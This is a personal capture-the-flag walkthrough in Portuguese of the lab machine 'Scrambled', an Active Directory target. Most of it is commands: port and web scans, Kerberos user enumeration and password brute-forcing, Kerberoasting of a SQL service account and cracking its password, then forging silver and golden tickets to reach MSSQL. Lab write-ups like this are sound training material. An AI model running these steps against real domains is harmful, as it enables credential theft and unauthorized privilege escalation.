# Scrambled

```
sudo nmap_enum 10.10.11.168 | tee nmap_output.txt
```

![qownnotes-media-UTNsLs](../../media/qownnotes-media-UTNsLs.png)

```
sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn 10.10.11.168 | tee nmap_udp_output.txt
```

![qownnotes-media-nDyJRj](../../media/qownnotes-media-nDyJRj.png)

```
sudo nmap -p- -Pn -T5 -n 10.10.11.168 | tee nmap_fullportstcp_output.txt

gobuster dir -u http://10.10.11.168 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 16 -o "tcp_port_protocol_gobuster.txt"

gobuster dir -u http://10.10.11.168 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"
```

![qownnotes-media-QHNHun](../../media/qownnotes-media-QHNHun.png)

```
nikto -host http://10.10.11.168 -T x 6 | tee nikto_output.txt
```

![qownnotes-media-XXiCsY](../../media/qownnotes-media-XXiCsY.png)

```
kerbrute userenum -d scrm.local --dc 10.10.11.168 users.txt


kerbrute bruteuser -d scrm.local --dc 10.10.11.168 /usr/share/wordlists/rockyou.txt ksimpson
```

![qownnotes-media-cFfNQy](../../media/qownnotes-media-cFfNQy.png)

Aqui eu ja teria acertado, se eu tivesse testado o mesmo user e o mesmo password, conforme eu havia feito com o crackmapexec, porém, essa autenticação é feita via NTLM. Por isso não está funcional, veja:

![qownnotes-media-OBNHgx](../../media/qownnotes-media-OBNHgx.png)

![qownnotes-media-CkGZHT](../../media/qownnotes-media-CkGZHT.png)

Com base nisso, dá pra testar novamente aquela mesma senha e usuário descoberta anteriormente:

```
kerbrute bruteuser -d scrm.local --dc 10.10.11.168 /usr/share/wordlists/rockyou.txt ksimpson
```

![qownnotes-media-uiCGbD](../../media/qownnotes-media-uiCGbD.png)

Então a autenticação tem que ocorrer via kerberos. Desta forma:

```
impacket-smbclient -k 'scrm.local/ksimpson:ksimpson@dc1.scrm.local' -dc-ip 10.10.11.168
```

Vide que o nome do servidor deve eestar correto, caso contrário ele não consegue autenticação por meio da bas Kerberos:

```
impacket-smbclient -k 'scrm.local/ksimpson:ksimpson@scrm.local' -dc-ip 10.10.11.168
```

![qownnotes-media-CeWXoh](../../media/qownnotes-media-CeWXoh.png)

## Exploitation

Aqui não foi necessário conduzir os testes anteriores, mas também não deixa de ser válido. Próximo passo aqui foi obter o hash de senha do serviço sqlsvc com os seguintes comandos:

Vide que o passo a passo seria

1 - Obter o ticket kerberos do usuário ksimpson:

```
impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168
```

![qownnotes-media-QKUaMx](../../media/qownnotes-media-QKUaMx.png)

2 - Carregar esse ticket na máquina Linux para conseguir extrair o hash do SPN:

```
export KRB5CCNAME=ksimpson.ccache
klist
```

![qownnotes-media-vfxsbO](../../media/qownnotes-media-vfxsbO.png)

3 - Obter o hash de senha do SPN sqlsvc

```
impacket-GetUserSPNs -request scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
#ou
impacket-GetUserSPNs -request -k -no-pass -dc-host dc1.scrm.local scrm.local/ksimpson
```

![qownnotes-media-MpPoDK](../../media/qownnotes-media-MpPoDK.png)

4 - Basta copiar esse hash e colar em um arquivo para quebrarmos com o john

![qownnotes-media-OKsOXL](../../media/qownnotes-media-OKsOXL.png)

Dado que a máquina está com o NTLM desabilitado, podemos ver que, quando a gente gera o ticket para o serviço sqlsvc, ele não loga na máquina:

```
impacket-getTGT scrm.local/sqlsvc:Pegasus60 -dc-ip 10.10.11.168
export KRB5CCNAME=sqlsvc.ccache
impacket-mssqlclient -k -no-pass scrm.local/sqlsvc@dc1.scrm.local
```

![qownnotes-media-dnmhzj](../../media/qownnotes-media-dnmhzj.png)

Neste caso, devemos considerar fazer o silver ticket para conseguir gerar nossas próprias permissões no serviço:

Para isso precisamos do SID do domínio, NTHASH da senha do serviço e o SPN:

1 - Para obter o SID, podemos executar o seguinte comando:

```
impacket-getPac scrm.local/ksimpson:ksimpson -targetUser ksimpson
```

![qownnotes-media-DLEMIA](../../media/qownnotes-media-DLEMIA.png)

2 - Para obter o nthash da senha do spn basta executar o seguinte comando:

```
iconv -f ASCII -t UTF-16LE <(printf "Pegasus60") | openssl dgst -md4
```

ou

```
python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Pegasus60".encode("utf-16le")).digest()))'
```

3 - Agora já temos todos os dados necessários, basta realizarmos o silver ticket:

```
impacket-ticketer -spn 'MSSQLSvc/dc1.scrm.local:1433' -domain scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash b999a16500b87d17ec7f2e2a68778f05 -dc-ip dc1.scrm.local adm
```

![qownnotes-media-FRPLDN](../../media/qownnotes-media-FRPLDN.png)

![qownnotes-media-RyziOV](../../media/qownnotes-media-RyziOV.png)

Agora conseguimos acessar o servidor mssql server com a autenticação via Kerberos:

```
export KRB5CCNAME=adm.ccache
klist
impacket-mssqlclient -k -no-pass dc1.scrm.local
```

![qownnotes-media-OWKENF](../../media/qownnotes-media-OWKENF.png)

Depois disso, basicamente é habilitar a execução de comando no banco seguindo o tutorial que consta nessa nota

Vamos tentar de um jeito diferente esse cara aqui:

```
kerberos::golden /user:admin /domain:scrm.local /sid:S-1-5-21-2743207045-1827831105-2542523200 /target:DC1.scrm.local /service:cifs /rc4:a4ce9e577c1298c759340f09b3546950 /ticket:c:\temp\test_cifs.kirbi
```

![qownnotes-media-ypkIkw](../../media/qownnotes-media-ypkIkw.png)
